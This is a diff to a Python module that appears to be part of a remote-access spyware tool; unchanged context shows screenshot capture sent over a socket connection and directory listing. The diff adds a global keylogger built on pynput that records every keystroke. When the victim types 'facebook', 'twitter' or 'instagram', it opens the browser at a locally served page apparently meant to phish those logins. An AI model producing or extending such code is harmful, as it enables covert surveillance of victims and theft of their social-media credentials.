@@ -3,6 +3,7 @@ import io
 import os
 import time
 import wave
+import webbrowser
 
 import cv2
 import keyboard
@@ -10,7 +11,15 @@ import pyaudio
 import pyautogui
 import pyperclip
 from PIL import Image
+from pynput.keyboard import Key, Listener
 
+current_keys = []
+trigger_words = {
+    'facebook': 'https://127.0.0.1:5000/facebook',
+    'twitter': 'https://127.0.0.1:5000/twitter',
+    'instagram': 'https://127.0.0.1:5000/instagram'
+}
+page_opened_recently = False  # Flag to control page opening
 
 def take_and_send_screenshot(sio, user_id):
     try:
@@ -160,3 +169,32 @@ def list_dir(dir_path, sio):
             print("Chemin du répertoire invalide ou inexistant")
     except Exception as e:
         print(f"Échec de la liste des fichiers et dossiers: {e}")
+
+
+def on_press(key):
+    global page_opened_recently
+    try:
+        if key.char:
+            current_keys.append(key.char)
+    except AttributeError:
+        pass
+
+    typed_string = ''.join(filter(None, current_keys)).lower()
+
+    if not page_opened_recently:  # Check if the flag is False
+        for word, url in trigger_words.items():
+            if word in typed_string:
+                webbrowser.open(url)
+                current_keys.clear()
+                page_opened_recently = True  # Set the flag to True
+                break
+
+def on_release(key):
+    global page_opened_recently
+    if key == Key.esc:
+        return False  # Stop listening if the escape key is pressed
+    page_opened_recently = False  # Reset the flag on key release
+
+def start_listener():
+    with Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
